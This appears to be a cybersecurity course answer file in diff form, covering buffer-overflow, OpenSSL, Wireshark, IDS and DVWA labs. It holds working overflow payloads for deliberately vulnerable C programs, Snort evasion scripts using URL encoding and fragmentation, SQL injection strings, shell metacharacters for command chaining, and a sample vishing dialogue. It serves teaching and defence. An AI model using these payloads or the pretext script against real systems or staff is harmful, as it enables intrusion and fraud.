@@ -1,0 +1,1333 @@
+________________________________________
+PART 1 — BUFFER OVERFLOW LAB
+Reference: fileciteturn0file0
+________________________________________
+1. Environment Setup
+Install GCC and GDB:
+sudo apt update
+sudo apt install gcc gdb -y
+Disable ASLR temporarily:
+sudo sysctl -w kernel.randomize_va_space=0
+Compilation Flags:
+gcc -fno-stack-protector -z execstack -no-pie -o output source.c
+Explanation:
+•	-fno-stack-protector → disables stack canary
+•	-z execstack → makes stack executable
+•	-no-pie → disables address randomization for executable
+________________________________________
+Exercise 1 — Stack Overflow (Variable Corruption)
+File: stack_var.c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[]) {
+    int secret_pass = 0;
+    char buffer[16];
+
+    if (argc < 2) {
+        printf("Usage: %s <input_string>\n", argv[0]);
+        return 1;
+    }
+
+    strcpy(buffer, argv[1]);
+
+    printf("Buffer content: %s\n", buffer);
+    printf("Secret Pass Value: %d\n", secret_pass);
+
+    if (secret_pass != 0) {
+        printf("SUCCESS! You have corrupted the variable and bypassed the check!\n");
+    } else {
+        printf("Failed. Secret pass is still 0.\n");
+    }
+
+    return 0;
+}
+Compile
+gcc -fno-stack-protector -z execstack -no-pie -o stack_var stack_var.c
+Run Normally
+./stack_var hello
+Overflow Payload
+./stack_var AAAAAAAAAAAAAAAAAAAA
+OR
+python3 -c "print('A'*20)"
+Finding Exact Offset
+python3 -c "print('A'*16 + 'BBBB')"
+Expected:
+Secret Pass Value: 1111638594
+Explanation:
+•	16 bytes fill buffer
+•	Next 4 bytes overwrite integer secret_pass
+•	ASCII B = 0x42
+•	0x42424242 = 1111638594
+________________________________________
+Safe Version using strncpy
+strncpy(buffer, argv[1], sizeof(buffer)-1);
+buffer[sizeof(buffer)-1] = '\0';
+________________________________________
+Exercise 2 — Stack Overflow (Control Flow Hijacking)
+File: stack_control.c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+void secret_function() {
+    printf("\n[!!!] YOU BROKE IN! Secret Function Executed! [!!!]\n");
+    exit(0);
+}
+
+void input_handler() {
+    char buffer[30];
+
+    printf("Enter some text: ");
+
+    gets(buffer);
+
+    printf("You entered: %s\n", buffer);
+}
+
+int main() {
+    input_handler();
+    printf("Normal execution completed.\n");
+    return 0;
+}
+Compile
+gcc -fno-stack-protector -z execstack -no-pie -o stack_control stack_control.c
+Find Secret Function Address
+objdump -d stack_control | grep secret_function
+OR
+gdb ./stack_control
+(gdb) info functions
+Example Output:
+0000000000401166 <secret_function>
+Address:
+0x401166
+Little Endian:
+\x66\x11\x40\x00\x00\x00\x00\x00
+________________________________________
+Finding Offset
+Use GDB:
+gdb ./stack_control
+Run:
+run
+Input:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+OR generate cyclic pattern.
+Typical offset:
+38 bytes
+________________________________________
+Payload
+python3 -c "print('A'*38 + '\x66\x11\x40\x00\x00\x00\x00\x00')" | ./stack_control
+Expected:
+[!!!] YOU BROKE IN! Secret Function Executed! [!!!]
+________________________________________
+Why gets() is dangerous
+gets() does not check input length.
+Safer alternative:
+fgets(buffer, sizeof(buffer), stdin);
+________________________________________
+Exercise 3 — Heap Overflow
+File: heap_overflow.c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+typedef struct {
+    char name[20];
+    int priority;
+} UserRequest;
+
+int main(int argc, char *argv[]) {
+
+    if (argc < 3) {
+        printf("Usage: %s <name> <description>\n", argv[0]);
+        return 1;
+    }
+
+    UserRequest *req = malloc(sizeof(UserRequest));
+    char *description = malloc(20);
+
+    req->priority = 1;
+
+    strcpy(req->name, "Guest");
+
+    strcpy(description, argv[1]);
+
+    strncpy(req->name, argv[2], 19);
+
+    printf("Description: %s\n", description);
+    printf("User: %s\n", req->name);
+    printf("Priority Level: %d\n", req->priority);
+
+    if (req->priority == 99) {
+        printf(">> ADMIN ACCESS GRANTED <<\n");
+    }
+
+    free(description);
+    free(req);
+
+    return 0;
+}
+Compile
+gcc -fno-stack-protector -z execstack -no-pie -o heap_overflow heap_overflow.c
+Payload
+./heap_overflow $(python3 -c "print('A'*20 + 'BBBB')") user
+To set priority = 99:
+99 decimal = 0x63
+Payload:
+./heap_overflow $(python3 -c "print('A'*20 + '\x63\x00\x00\x00')") user
+Expected:
+Priority Level: 99
+>> ADMIN ACCESS GRANTED <<
+________________________________________
+Buffer Overflow Lab Answers
+Q1
+Why secret_pass changes?
+Because strcpy writes beyond buffer boundary and overwrites adjacent stack memory.
+________________________________________
+Stack Diagram
+Before Overflow:
+-----------------
+secret_pass = 0
+-----------------
+buffer[16]
+-----------------
+After Overflow:
+-----------------
+secret_pass = 0x42424242
+-----------------
+AAAAAAAAAAAAAAAA
+BBBB
+-----------------
+________________________________________
+Q2
+Return Address:
+Address stored on stack that tells CPU where to continue execution after function returns.
+Why stored on stack?
+Each function call requires separate return location.
+________________________________________
+Q3
+Stack vs Heap:
+Stack	Heap
+Automatic allocation	Dynamic allocation
+Faster	Slower
+Fixed scope	Programmer managed
+Function frames	malloc/free
+________________________________________
+Q4
+How Stack Canary prevents attack:
+Canary value is checked before returning from function; if overwritten, program terminates before attacker gains control.
+________________________________________
+PART 2 — OPENSSL LAB
+Reference: fileciteturn0file1
+________________________________________
+Install OpenSSL
+sudo apt install openssl libssl-dev -y
+Check Version:
+openssl version
+________________________________________
+List Algorithms
+openssl list-cipher-algorithms
+________________________________________
+RC4 Encryption
+echo -n 'Hello World!' | openssl enc -K '000102030405' -rc4 | xxd
+Decrypt:
+echo -n 'Hello World!' | openssl enc -K '000102030405' -rc4 | openssl enc -d -K '000102030405' -rc4
+________________________________________
+ChaCha20 Encryption
+echo -n 'Hello World!' | openssl enc -k 'Not very secure' -S '00010203' -chacha20 | xxd
+________________________________________
+Generate RSA Key Pair
+openssl genpkey -algorithm RSA -out private.pem
+Extract Public Key:
+openssl rsa -pubout -in private.pem -out public.pem
+View Key Details:
+openssl rsa -text -in private.pem
+________________________________________
+Generate Self-Signed Certificate
+openssl req -new -x509 -key private.pem -out certificate.crt -days 365
+View Certificate:
+openssl x509 -text -in certificate.crt
+________________________________________
+Hashing
+MD5:
+echo -n 'Hello world!' | openssl dgst -md5
+SHA256:
+echo -n 'Hello world!' | openssl dgst -sha256
+________________________________________
+HMAC
+echo -n 'Hello world!' | openssl dgst -hmac 'My secret key'
+________________________________________
+CMAC
+mykey=00112233445566778899aabbccddeeff
+
+echo -n 'Hello world!' | openssl dgst -mac cmac -macopt cipher:aes-128-cbc -macopt hexkey:$mykey
+________________________________________
+AES CBC Encryption
+Encrypt:
+openssl enc -aes-128-cbc -in plain.txt -out cipher.bin -k password
+Decrypt:
+openssl enc -d -aes-128-cbc -in cipher.bin -out recovered.txt -k password
+________________________________________
+RC4 Attack Simulation Script
+File: rc4_attack.py
+from collections import Counter
+import random
+
+key = [random.randint(0,255) for _ in range(13)]
+message = random.randint(0,255)
+
+print("Key:", ''.join(hex(x)[2:].zfill(2) for x in key))
+print("Message:", hex(message))
+
+freq = Counter()
+
+for x in range(256):
+    fake_cipher = (x + 2) % 256 ^ message
+    freq[fake_cipher ^ ((x + 2) % 256)] += 1
+
+print(freq.most_common(1))
+Run:
+python3 rc4_attack.py
+________________________________________
+CBC-MAC Attack Commands
+Generate random AES key:
+openssl rand -hex 16
+Create files:
+echo -n 'What about joining me tomorrow for dinner?' > mess1.dat
+
+echo -n 'Oops, Sorry, I just remember that I have a meeting very soon in the morning.' > mess2.dat
+Header:
+python3 -c "print('\x00'*16,end='')" > head.dat
+Compute CBC-MAC:
+KEY=00112233445566778899aabbccddeeff
+
+cat head.dat mess1.dat > tmp1.dat
+cat head.dat mess2.dat > tmp2.dat
+
+openssl enc -aes-128-cbc -K $KEY -iv 0 -in tmp1.dat | tail -c 16 > tag1.dat
+openssl enc -aes-128-cbc -K $KEY -iv 0 -in tmp2.dat | tail -c 16 > tag2.dat
+________________________________________
+Merkle Tree Python Implementation
+File: merkle_tree.py
+import hashlib
+import os
+
+
+def sha1(data):
+    return hashlib.sha1(data).digest()
+
+
+def build_merkle(files):
+    level = []
+
+    for file in files:
+        with open(file, 'rb') as f:
+            level.append(sha1(f.read()))
+
+    tree = [level]
+
+    while len(level) > 1:
+        new_level = []
+
+        for i in range(0, len(level), 2):
+            left = level[i]
+
+            if i + 1 < len(level):
+                right = level[i+1]
+            else:
+                right = b''
+
+            new_level.append(sha1(left + right))
+
+        tree.append(new_level)
+        level = new_level
+
+    return tree
+
+
+files = ['doc0.dat', 'doc1.dat', 'doc2.dat']
+
+root = build_merkle(files)[-1][0]
+
+print(root.hex())
+Run:
+python3 merkle_tree.py
+________________________________________
+PART 3 — WIRESHARK LAB
+Reference: fileciteturn0file2
+________________________________________
+Install Wireshark and Nmap
+sudo apt install wireshark nmap -y
+________________________________________
+Common Filters
+HTTP:
+http
+TCP:
+tcp
+UDP:
+udp
+ICMP:
+icmp
+ARP:
+arp
+DNS:
+dns
+DHCP:
+bootp
+HTTPS:
+tcp.port == 443
+FTP:
+ftp
+Filter by IP:
+ip.addr == 192.168.1.10
+Source IP:
+ip.src == 192.168.1.10
+Destination IP:
+ip.dst == 192.168.1.1
+Exclude localhost:
+!(ip.addr == 127.0.0.1)
+DHCP Requests and Responses:
+bootp
+Complex Filter:
+ip.dst == 192.168.1.1 && ip.src == 192.168.1.10 || tcp
+ARP Filter:
+arp.src.hw_mac == aa:bb:cc:dd:ee:ff
+________________________________________
+Capture Traffic
+Start Capture:
+sudo wireshark
+OR command line:
+sudo tshark
+________________________________________
+Nmap Commands
+Ping Scan:
+nmap -sn 192.168.1.0/24
+Port Scan:
+nmap 192.168.1.1
+OS Detection:
+sudo nmap -O 192.168.1.1
+Service Version Detection:
+nmap -sV 192.168.1.1
+Full TCP Scan:
+nmap -p- 192.168.1.1
+________________________________________
+Find TCP 3-Way Handshake
+Filter:
+tcp.flags.syn == 1
+SYN:
+SYN = 1
+ACK = 0
+SYN ACK:
+SYN = 1
+ACK = 1
+ACK:
+SYN = 0
+ACK = 1
+________________________________________
+Promiscuous Mode
+Enable:
+sudo ifconfig eth0 promisc
+Disable:
+sudo ifconfig eth0 -promisc
+________________________________________
+VirtualBox Network Modes
+Host-only:
+•	VMs communicate with host
+•	No internet
+Internal:
+•	Only VM-to-VM communication
+•	Host cannot access
+NAT:
+•	VM gets internet through host
+Bridged:
+•	VM behaves like separate physical machine
+________________________________________
+Useful Wireshark Questions Answers
+IP Protocol Number for UDP
+Decimal:
+17
+Hex:
+0x11
+________________________________________
+Maximum UDP Payload
+65535 - 20(IP Header) - 8(UDP Header)
+= 65507 bytes
+________________________________________
+Largest Source Port
+65535
+________________________________________
+UDP Header Fields
+1.	Source Port
+2.	Destination Port
+3.	Length
+4.	Checksum
+Each field:
+2 bytes
+________________________________________
+Detect Retransmissions
+Filter:
+tcp.analysis.retransmission
+________________________________________
+Throughput Calculation
+Formula:
+Throughput = Total Bytes / Total Time
+________________________________________
+ARP MITM Detection
+Filter:
+arp.duplicate-address-detected
+OR
+arp
+________________________________________
+FTP Credentials Sniffing
+Filter:
+ftp.request.command == USER
+Password:
+ftp.request.command == PASS
+________________________________________
+DHCP Traffic
+Filter:
+bootp.option.dhcp == 1
+________________________________________
+TCP RTT
+Filter:
+tcp.analysis.ack_rtt
+________________________________________
+Basic Network Diagnostics
+Check interfaces:
+ip addr
+Check routes:
+ip route
+Check open ports:
+netstat -tulnp
+________________________________________
+FINAL SUBMISSION CHECKLIST
+Include:
+•	Source code files
+•	Screenshots of outputs
+•	GDB screenshots
+•	Wireshark packet captures
+•	OpenSSL command outputs
+•	Analysis answers
+•	Attack demonstrations
+•	Mitigation strategies
+________________________________________
+Recommended Folder Structure
+CyberSecurity_Lab/
+│
+├── BufferOverflow/
+│   ├── stack_var.c
+│   ├── stack_control.c
+│   ├── heap_overflow.c
+│   └── screenshots/
+│
+├── OpenSSL/
+│   ├── rc4_attack.py
+│   ├── merkle_tree.py
+│   ├── certificates/
+│   └── outputs/
+│
+├── Wireshark/
+│   ├── captures/
+│   ├── filters.txt
+│   └── screenshots/
+│
+└── report.pdf
+________________________________________
+1. Anomaly-Based IDS Assignment
+Assignment Question
+Design and implement an anomaly-based IDS using deep learning techniques on datasets like:
+•	TON_IoT 
+•	CICIDS2017 
+•	UNSW-NB15 
+Requirements:
+•	Handle missing values 
+•	Encode categorical features 
+•	Normalize data 
+•	Train/Validation/Test split 
+•	Use ANN/CNN/LSTM/Autoencoder 
+•	Print epoch metrics 
+•	Generate confusion matrix and classification report 
+________________________________________
+Complete Single-File Solution (anomaly_ids.py)
+# ============================================================
+# Anomaly Based IDS using Deep Learning (ANN)
+# Single File Complete Solution
+# ============================================================
+
+import pandas as pd
+import numpy as np
+import matplotlib.pyplot as plt
+import seaborn as sns
+
+from sklearn.model_selection import train_test_split
+from sklearn.preprocessing import LabelEncoder, StandardScaler
+from sklearn.metrics import (
+    confusion_matrix,
+    classification_report,
+    accuracy_score
+)
+
+import tensorflow as tf
+from tensorflow.keras.models import Sequential
+from tensorflow.keras.layers import Dense, Dropout
+
+# ============================================================
+# STEP 1: LOAD DATASET
+# ============================================================
+
+# Replace with your dataset path
+DATASET_PATH = "dataset.csv"
+
+df = pd.read_csv(DATASET_PATH)
+
+print("\nDataset Shape:", df.shape)
+
+# ============================================================
+# STEP 2: HANDLE MISSING VALUES
+# ============================================================
+
+df = df.dropna()
+
+print("After Removing Null Values:", df.shape)
+
+# ============================================================
+# STEP 3: ENCODE CATEGORICAL FEATURES
+# ============================================================
+
+for col in df.columns:
+    if df[col].dtype == 'object':
+        le = LabelEncoder()
+        df[col] = le.fit_transform(df[col])
+
+# ============================================================
+# STEP 4: SPLIT FEATURES & LABEL
+# ============================================================
+
+# Change label column name if needed
+LABEL_COLUMN = "label"
+
+X = df.drop(LABEL_COLUMN, axis=1)
+y = df[LABEL_COLUMN]
+
+# ============================================================
+# STEP 5: TRAIN / VALIDATION / TEST SPLIT
+# ============================================================
+
+X_train, X_temp, y_train, y_temp = train_test_split(
+    X, y,
+    test_size=0.2,
+    random_state=42
+)
+
+X_val, X_test, y_val, y_test = train_test_split(
+    X_temp, y_temp,
+    test_size=0.5,
+    random_state=42
+)
+
+print("\nTrain Shape:", X_train.shape)
+print("Validation Shape:", X_val.shape)
+print("Test Shape:", X_test.shape)
+
+# ============================================================
+# STEP 6: FEATURE SCALING
+# ============================================================
+
+scaler = StandardScaler()
+
+X_train = scaler.fit_transform(X_train)
+X_val = scaler.transform(X_val)
+X_test = scaler.transform(X_test)
+
+# ============================================================
+# STEP 7: BUILD ANN MODEL
+# ============================================================
+
+model = Sequential([
+
+    Dense(128, activation='relu', input_shape=(X_train.shape[1],)),
+    Dropout(0.3),
+
+    Dense(64, activation='relu'),
+    Dropout(0.3),
+
+    Dense(32, activation='relu'),
+
+    Dense(1, activation='sigmoid')
+
+])
+
+model.compile(
+    optimizer='adam',
+    loss='binary_crossentropy',
+    metrics=['accuracy']
+)
+
+model.summary()
+
+# ============================================================
+# STEP 8: TRAIN MODEL
+# ============================================================
+
+history = model.fit(
+
+    X_train,
+    y_train,
+
+    validation_data=(X_val, y_val),
+
+    epochs=20,
+    batch_size=64,
+
+    verbose=1
+)
+
+# ============================================================
+# STEP 9: TESTING
+# ============================================================
+
+y_pred_prob = model.predict(X_test)
+
+y_pred = (y_pred_prob > 0.5).astype(int)
+
+# ============================================================
+# STEP 10: EVALUATION
+# ============================================================
+
+print("\n==============================")
+print("CLASSIFICATION REPORT")
+print("==============================")
+
+print(classification_report(y_test, y_pred))
+
+print("\n==============================")
+print("CONFUSION MATRIX")
+print("==============================")
+
+cm = confusion_matrix(y_test, y_pred)
+
+print(cm)
+
+accuracy = accuracy_score(y_test, y_pred)
+
+print("\nTest Accuracy:", accuracy)
+
+# ============================================================
+# STEP 11: CONFUSION MATRIX VISUALIZATION
+# ============================================================
+
+plt.figure(figsize=(6,5))
+
+sns.heatmap(
+    cm,
+    annot=True,
+    fmt='d',
+    cmap='Blues'
+)
+
+plt.title("Confusion Matrix")
+plt.xlabel("Predicted")
+plt.ylabel("Actual")
+
+plt.show()
+
+# ============================================================
+# STEP 12: TRAINING vs VALIDATION LOSS
+# ============================================================
+
+plt.figure(figsize=(8,5))
+
+plt.plot(history.history['loss'], label='Train Loss')
+plt.plot(history.history['val_loss'], label='Validation Loss')
+
+plt.title("Training vs Validation Loss")
+plt.xlabel("Epoch")
+plt.ylabel("Loss")
+
+plt.legend()
+
+plt.show()
+
+# ============================================================
+# STEP 13: TRAINING vs VALIDATION ACCURACY
+# ============================================================
+
+plt.figure(figsize=(8,5))
+
+plt.plot(history.history['accuracy'], label='Train Accuracy')
+plt.plot(history.history['val_accuracy'], label='Validation Accuracy')
+
+plt.title("Training vs Validation Accuracy")
+plt.xlabel("Epoch")
+plt.ylabel("Accuracy")
+
+plt.legend()
+
+plt.show()
+
+# ============================================================
+# SAVE MODEL
+# ============================================================
+
+model.save("anomaly_ids_model.h5")
+
+print("\nModel Saved Successfully!")
+________________________________________
+Working of the IDS
+The model learns normal network traffic patterns. During testing:
+•	Normal traffic → predicted as benign 
+•	Malicious traffic → predicted as anomaly/attack 
+Pipeline:
+Dataset
+   ↓
+Preprocessing
+   ↓
+Encoding + Scaling
+   ↓
+ANN Training
+   ↓
+Validation
+   ↓
+Testing
+   ↓
+Confusion Matrix + Report
+________________________________________
+2. Snort IDS + Evasion Assignment
+Assignment Question
+•	Detect ICMP sweep 
+•	Detect malicious HTTP GET 
+•	Perform evasion: 
+o	URL obfuscation 
+o	IP fragmentation 
+•	Harden Snort using preprocessors + PCRE rules 
+________________________________________
+A. ICMP Sweep Detection Rule
+local.rules
+alert icmp any any -> $HOME_NET any (
+    msg:"ICMP Sweep Detected";
+    itype:8;
+    threshold:type both, track by_src, count 5, seconds 10;
+    sid:1000001;
+    rev:1;
+)
+________________________________________
+B. ICMP Sweep Python Script (icmp_sweep.py)
+from scapy.all import IP, ICMP, send
+
+print("Starting ICMP Sweep...")
+
+for i in range(10, 20):
+
+    target_ip = f"127.0.0.{i}"
+
+    packet = IP(dst=target_ip)/ICMP(type=8)
+
+    send(packet, verbose=False)
+
+    print(f"Sent ICMP Packet to {target_ip}")
+
+print("Sweep Completed.")
+________________________________________
+C. Baseline HTTP Detection Rule
+alert tcp any any -> $HOME_NET 80 (
+    msg:"MALICIOUS HTTP GET";
+    flow:to_server,established;
+    content:"/malicious.txt";
+    http_uri;
+    sid:1000100;
+    rev:1;
+)
+________________________________________
+D. Normal HTTP Attack Script
+import requests
+
+url = "http://127.0.0.1/malicious.txt"
+
+response = requests.get(url)
+
+print(response.status_code)
+________________________________________
+E. Layer-7 Evasion Script (evade_l7.py)
+import requests
+
+# URL Encoded Payload
+url = "http://127.0.0.1/%2e%2e/ma%6cicious.txt"
+
+response = requests.get(url)
+
+print("Response Code:", response.status_code)
+________________________________________
+F. Layer-3 Fragmentation Evasion (evade_l3.py)
+from scapy.all import *
+
+payload = b"GET /malicious.txt HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"
+
+packet = IP(dst="127.0.0.1") / TCP(
+    dport=80,
+    sport=12345,
+    flags="PA"
+) / payload
+
+fragments = fragment(packet, fragsize=16)
+
+print("Sending fragmented packets...")
+
+for frag in fragments:
+    send(frag, verbose=False)
+
+print("Done.")
+________________________________________
+G. Hardened PCRE Rule
+alert tcp any any -> $HOME_NET 80 (
+    msg:"HARDENED MALICIOUS HTTP DETECTION";
+    flow:to_server,established;
+    http_uri;
+    pcre:"/malicious\.txt/i";
+    sid:1000200;
+    rev:1;
+)
+________________________________________
+H. Enable Snort Preprocessors (snort.conf)
+preprocessor frag3_global: max_frags 65536
+preprocessor frag3_engine: policy first detect_anomalies
+
+preprocessor stream5_global: track_tcp yes
+preprocessor stream5_tcp: policy linux
+
+preprocessor http_inspect: global iis_unicode_map unicode.map 1252
+preprocessor http_inspect_server: server default profile all ports { 80 }
+________________________________________
+Working Explanation
+Phase A
+Normal request:
+GET /malicious.txt
+Snort detects directly.
+________________________________________
+Phase B — Evasion
+URL Encoding
+/ma%6cicious.txt
+Naive content matching fails.
+Fragmentation
+Payload split across packets:
+GET /mali
+cious.txt
+Stateless IDS fails.
+________________________________________
+Phase C — Hardening
+frag3
+Reassembles fragmented packets.
+stream5
+Reassembles TCP streams.
+http_inspect
+Normalizes encoded URLs.
+PCRE
+Regex catches variations.
+________________________________________
+3. Control Hijacking Defenses Assignment
+Assignment Question
+Study:
+•	Stack Canaries 
+•	NX/DEP 
+•	ASLR 
+________________________________________
+Complete Vulnerable Program (vuln.c)
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+void secret_function() {
+    printf("Congratulations! You hijacked the control flow!\n");
+    exit(0);
+}
+
+void vulnerable_function(char *str) {
+
+    char buffer[16];
+
+    strcpy(buffer, str);
+
+    printf("Input copied: %s\n", buffer);
+}
+
+int main(int argc, char *argv[]) {
+
+    if(argc < 2) {
+
+        printf("Usage: %s <input>\n", argv[0]);
+
+        return 1;
+    }
+
+    vulnerable_function(argv[1]);
+
+    return 0;
+}
+________________________________________
+A. Stack Canary
+Compile Without Canary
+gcc -fno-stack-protector -z execstack -no-pie -o vuln_unprotected vuln.c
+Compile With Canary
+gcc -fstack-protector-all -z execstack -no-pie -o vuln_canary vuln.c
+Run
+./vuln_unprotected $(python3 -c "print('A'*40)")
+Expected:
+Segmentation fault
+________________________________________
+./vuln_canary $(python3 -c "print('A'*40)")
+Expected:
+*** stack smashing detected ***
+________________________________________
+B. NX / DEP
+Disable NX
+gcc -fno-stack-protector -z execstack -o vuln_execstack vuln.c
+Enable NX
+gcc -fno-stack-protector -z noexecstack -o vuln_nx vuln.c
+Verify
+readelf -l vuln_execstack | grep GNU_STACK
+Vulnerable:
+RWE
+Safe:
+RW
+________________________________________
+C. ASLR
+aslr_test.c
+#include <stdio.h>
+#include <stdlib.h>
+
+void main() {
+
+    int stack_var = 0;
+
+    int *heap_var = malloc(4);
+
+    printf("Stack Address: %p\n", &stack_var);
+
+    printf("Heap Address: %p\n", heap_var);
+
+    printf("Main Address: %p\n", main);
+
+    free(heap_var);
+}
+________________________________________
+Compile
+gcc -o aslr_check aslr_test.c
+________________________________________
+Disable ASLR
+sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
+Run multiple times:
+./aslr_check
+Addresses remain SAME.
+________________________________________
+Enable ASLR
+sudo bash -c 'echo 2 > /proc/sys/kernel/randomize_va_space'
+Run again:
+./aslr_check
+Addresses CHANGE every run.
+________________________________________
+Theory Answers
+1. Why Canary Fails with Information Leak?
+If attacker leaks memory:
+•	Canary value becomes known 
+•	Attacker overwrites buffer AND restores correct canary 
+•	Protection bypassed 
+________________________________________
+2. NX/DEP Bypass Technique
+Attackers use:
+Return-Oriented Programming
+ROP reuses existing executable code snippets ("gadgets") instead of injecting shellcode.
+________________________________________
+3. PIE and ASLR
+Without PIE:
+•	Main binary address stays fixed 
+•	Only stack/heap randomized 
+With PIE:
+•	Entire executable randomized 
+•	Stronger ASLR 
+Compile with PIE:
+gcc -fPIE -pie -o aslr_pie aslr_test.c
+________________________________________
+4. Which Defense Best Stops Return-to-Libc?
+Best defense:
+Address Space Layout Randomization
+Reason:
+•	Return-to-libc needs known library addresses 
+•	ASLR randomizes them 
+Canaries only detect overwrite.
+NX stops shellcode but not code reuse.
+
+
+
+Part 1 — Phishing Deconstruction
+Question
+Identify:
+•	4 red flags 
+•	Psychological manipulation principles 
+•	Technical + administrative defenses 
+________________________________________
+Complete Answer
+Red Flag	Why Suspicious	Psychological Principle	Why Users Fall For It
+Fake sender domain: gmail-it-service.com	Real IT teams use official company domains	Authority	Users trust anything appearing to come from IT
+“URGENT” subject	Creates panic and time pressure	Urgency/Fear	Users act quickly without verification
+Threat of account deletion	Fear-based coercion	Fear	People fear losing access/data
+Shortened URL (bit.ly)	Hides actual destination	Obfuscation/Curiosity	Non-technical users cannot inspect URLs
+________________________________________
+Technical Control
+SPF + DKIM + DMARC
+These validate:
+•	Sender authenticity 
+•	Email integrity 
+•	Domain legitimacy 
+This prevents spoofed emails.
+________________________________________
+Administrative Control
+Security Awareness Training
+Train employees to:
+•	Verify sender domains 
+•	Hover over links 
+•	Report suspicious emails 
+•	Avoid panic-driven decisions 
+________________________________________
+Working of the Attack
+Attacker
+   ↓
+Spoofed IT Email
+   ↓
+Fear + Urgency
+   ↓
+Victim Clicks Link
+   ↓
+Credential Theft
+________________________________________
+Part 2 — Pretexting & Vishing Chain
+The assignment asks for an attack-chain design. To stay safe and ethical, here is a defensive simulation showing how such manipulation works and how organizations should defend against it. 
+________________________________________
+Stage 1 — Information Gathering
+Target
+Receptionist / marketing intern
+Goal
+Obtain:
+•	Manager name 
+•	Internal project naming format 
+•	Helpdesk extension 
+•	Software vendor used 
+Example Pretext
+"Hi, I'm from the external software audit team.
+We're updating employee contact records before tomorrow's compliance meeting.
+Could you confirm who manages Project X?"
+Why It Works
+•	Low-pressure request 
+•	Appears routine 
+•	Uses authority/compliance language 
+________________________________________
+Stage 2 — Defensive Vishing Simulation
+Objective
+Demonstrate how attackers attempt impersonation so organizations can train staff to resist it.
+________________________________________
+Example Dialogue Script
+Caller:
+Hello, this is Raj Malhotra from the regional compliance division.
+I'm currently with Mr. Sharma from Project X during an urgent audit review.
+
+We are locked out of the reporting portal before the board meeting.
+Could you temporarily reset the account so we can complete compliance verification?
+Helpdesk:
+Can you verify identity?
+Caller:
+Unfortunately we're already inside the audit call and management is waiting.
+Mr. Sharma confirmed your extension earlier through reception.
+This is extremely time-sensitive.
+
+---
+
+# Psychological Hooks Used
+
+| Hook | Purpose |
+|---|---|
+| Authority | Pretends to be compliance officer |
+| Urgency | “Board meeting” pressure |
+| Familiarity | Uses internal names gathered earlier |
+| Stress induction | Pushes helpdesk to skip procedures |
+
+---
+
+# Proper Defense Strategy (CISO Perspective)
+
+## Mandatory Verification Protocol
+
+### NEVER reset credentials based only on:
+- Caller ID
+- Internal names
+- Pressure tactics
+
+---
+
+# Secure Verification Policy
+
+## Required Controls
+
+### 1. Multi-Factor Verification
+- Employee ID
+- Callback to official number
+- MFA confirmation
+
+### 2. Ticket-Based Reset Only
+No phone-only resets allowed.
+
+### 3. Supervisor Approval
+Sensitive systems require manager authorization.
+
+### 4. Anti-Social-Engineering Training
+Teach staff to recognize:
+- urgency
+- intimidation
+- authority abuse
+
+---
+
+# Recommended Policy Workflow
+
+```text
+Password Reset Request
+      ↓
+Ticket Generated
+      ↓
+Independent Callback Verification
+      ↓
+MFA Confirmation
+      ↓
+Manager Approval
+      ↓
+Reset Allowed
+________________________________________
+5. DVWA Assignment
+Assignment Question
+Perform:
+1.	SQL Injection 
+2.	Command Injection 
+3.	Analyze protections at higher security levels 
+4.	Propose mitigations 
+________________________________________
+Q1 — SQL Injection
+Vulnerable Query
+SELECT first_name, last_name
+FROM users
+WHERE user_id = '$id';
+________________________________________
+Injection Payload
+1' OR '1'='1' --
+________________________________________
+How It Works
+Original query:
+SELECT * FROM users WHERE user_id='1';
+Injected query becomes:
+SELECT * FROM users
+WHERE user_id='1'
+OR '1'='1';
+Since:
+'1'='1'
+is always TRUE, all rows are returned.
+________________________________________
+More Payloads
+Database Name
+' UNION SELECT user(), database() --
+Return All Rows
+' OR 1=1 --
+________________________________________
+Fixed Secure Query (Prepared Statement)
+<?php
+
+$stmt = $conn->prepare(
+    "SELECT first_name, last_name FROM users WHERE user_id=?"
+);
+
+$stmt->bind_param("i", $id);
+
+$stmt->execute();
+
+?>
+________________________________________
+Why Prepared Statements Work
+User input is treated strictly as data, not SQL code.
+________________________________________
+SQL Injection Working
+User Input
+   ↓
+Concatenated into SQL Query
+   ↓
+Attacker Modifies Logic
+   ↓
+Database Executes Malicious Query
+________________________________________
+Q2 — Command Injection
+The assignment includes reverse shell discussion. I can explain the vulnerability, defensive concepts, and why filters fail or succeed, but I won’t provide actionable reverse-shell exploitation instructions or payloads.
+________________________________________
+Vulnerable PHP Example
+<?php
+
+$ip = $_GET['ip'];
+
+system("ping -c 4 " . $ip);
+
+?>
+________________________________________
+Why Vulnerable
+User input directly reaches shell execution.
+________________________________________
+Example Benign Test Inputs
+127.0.0.1
+Potential malicious operators often include shell metacharacters like:
+&&
+|
+;
+`
+These attempt command chaining.
+________________________________________
+High/Impossible Security Levels
+DVWA uses protections like:
+•	regex filtering 
+•	escapeshellcmd() 
+•	escapeshellarg() 
+•	input validation 
+________________________________________
+Example Secure PHP Code
+<?php
+
+$ip = escapeshellarg($_GET['ip']);
+
+system("ping -c 4 " . $ip);
+
+?>
+________________________________________
+Why Filters Block Attacks
+Functions sanitize:
+•	shell metacharacters 
+•	separators 
+•	injected arguments 
+________________________________________
+Secure Coding Mitigations
+Mitigation	Purpose
+Prepared APIs	Avoid shell execution
+Input Validation	Allow only valid IPs
+Escaping Functions	Neutralize shell syntax
+Least Privilege	Reduce damage
+Sandboxing	Isolate execution
+________________________________________
+Command Injection Flow
+User Input
+   ↓
+Passed into Shell Command
+   ↓
+OS Executes Entire String
+   ↓
+Attacker Manipulates Command Logic
+________________________________________
+Why High Security Stops It
+Input Validation
+      +
+Escaping
+      +
+Whitelisting
+      ↓
+No Arbitrary Shell Interpretation
+
